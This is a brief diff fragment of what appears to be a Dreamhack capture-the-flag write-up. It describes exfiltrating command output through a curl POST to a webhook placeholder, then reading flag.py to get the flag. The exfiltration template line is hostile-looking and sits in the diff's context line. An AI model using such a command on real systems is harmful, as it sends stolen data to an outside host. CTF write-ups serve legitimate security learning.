@@ -17,6 +17,8 @@ curl -X POST "http://webhook.url" --data "$(<command>)"
 
 Use that and submit using a HEAD request:
 ![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/f32ebfe933ec373c2d3d874f1f3bc0ff642dcbb4fba364954ae32aab8a990d11.png)
+
 We get the output in webhook:
 ![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/cad6b94f54de4dfd417dc15c56ce055ca7700219f7c42bfcce011380bd78a437.png)
+
 Spot the flag.py file, cat that file and get the flag.
